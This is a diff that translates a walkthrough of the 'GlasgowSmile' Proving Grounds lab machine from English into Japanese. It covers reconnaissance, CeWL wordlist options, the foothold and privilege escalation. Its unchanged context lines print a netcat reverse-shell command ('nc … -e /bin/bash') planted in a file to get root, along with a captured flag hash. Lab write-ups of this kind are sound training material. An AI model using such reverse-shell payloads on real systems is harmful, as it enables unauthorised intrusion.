@@ -15,9 +15,9 @@ alt_en: /posts/pg-glasgowsmile/
 |---------------------------|-------|
 | OS | Linux |
 | 難易度 | 記録なし |
-| 攻撃対象 | Web application and exposed network services |
-| 主な侵入経路 | Web-based initial access |
-| 権限昇格経路 | Local enumeration -> misconfiguration abuse -> root |
+| 攻撃対象 | Webアプリケーションおよび公開されたネットワークサービス |
+| 主な侵入経路 | Webベースの初期アクセス |
+| 権限昇格経路 | ローカル列挙 -> 設定ミスの悪用 -> root |
 
 ## 認証情報
 
@@ -26,8 +26,8 @@ alt_en: /posts/pg-glasgowsmile/
 ## 偵察
 
 ---
-💡 なぜ有効か  
-This stage maps the reachable attack surface and identifies where exploitation is most likely to succeed. Accurate service and content discovery reduces blind testing and drives targeted follow-up actions.
+💡 なぜ有効か
+このフェーズでは到達可能な攻撃対象領域を把握し、悪用が成功しやすい箇所を特定します。正確なサービスおよびコンテンツの探索により、無駄な試行を減らし、的を絞った後続アクションを導きます。
 
 ## 初期足がかり
 
@@ -256,10 +256,10 @@ CeWL 6.2.1 (More Fixes) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
 
 ```
 
-- -d 4-> means depth to spider to , more depth returns better results,default is 2  
-- -m -> maximum word count  
-- -w -> write output to  
-- --url -> target url
+- -d 4 -> クロールする深さを指定。深いほど結果が多く得られる（デフォルトは2）
+- -m -> 最小単語文字数
+- -w -> 出力先ファイル
+- --url -> 対象URL
 攻撃チェーンを進め、次の仮説を検証するために以下のコマンドを実行します。オープンサービス、悪用可否、認証情報の露出、権限境界などの指標を確認します。コマンドとパラメータはそのまま記録し、追試できる形を維持します。
 
 ```bash
@@ -336,8 +336,8 @@ cat local.txt
 85f06c9fcc65e506e0e901f7f1eb29b2
 ```
 
-💡 なぜ有効か  
-The initial access step chains discovered weaknesses into executable control over the target. Successful foothold techniques are validated by command execution or interactive shell callbacks.
+💡 なぜ有効か
+初期アクセスのステップでは、発見した弱点を連鎖させ、対象に対する実行可能な制御を確立します。足がかりの成功は、コマンド実行またはインタラクティブなシェルのコールバックによって検証されます。
 
 ## 権限昇格
 
@@ -593,7 +593,7 @@ echo 'nc 192.168.45.180 4445 -e /bin/bash'>.trash_old
 penguin@glasgowsmile:~/SomeoneWhoHidesBehindAMask$ echo 'nc 192.168.45.180 4445 -e /bin/bash'>.trash_old
 ```
 
-Retrieved proof.txt:
+proof.txt を取得しました：
 攻撃チェーンを進め、次の仮説を検証するために以下のコマンドを実行します。オープンサービス、悪用可否、認証情報の露出、権限境界などの指標を確認します。コマンドとパラメータはそのまま記録し、追試できる形を維持します。
 
 ```bash
@@ -628,8 +628,8 @@ root@glasgowsmile:~#
 
 ```
 
-💡 なぜ有効か  
-Privilege escalation relies on local misconfigurations, unsafe permissions, and trusted execution paths. Enumerating and abusing these trust boundaries is the fastest route to root-level access.
+💡 なぜ有効か
+権限昇格はローカルの設定ミス、安全でないパーミッション、信頼された実行パスに依存します。これらの信頼境界を列挙して悪用することが、rootレベルのアクセスへの最短経路です。
 
 ## まとめ・学んだこと
 
@@ -638,7 +638,7 @@ Privilege escalation relies on local misconfigurations, unsafe permissions, and 
 - ワイルドカード展開やスクリプト化可能な特権ツールを避けるため sudo ポリシーを強化する。
 - 露出した認証情報と環境ファイルを重要機密として扱う。
 
-### Attack Flow
+### 攻撃フロー
 
 ---
 攻撃チェーンを進め、次の仮説を検証するために以下のコマンドを実行します。オープンサービス、悪用可否、認証情報の露出、権限境界などの指標を確認します。コマンドとパラメータはそのまま記録し、追試できる形を維持します。
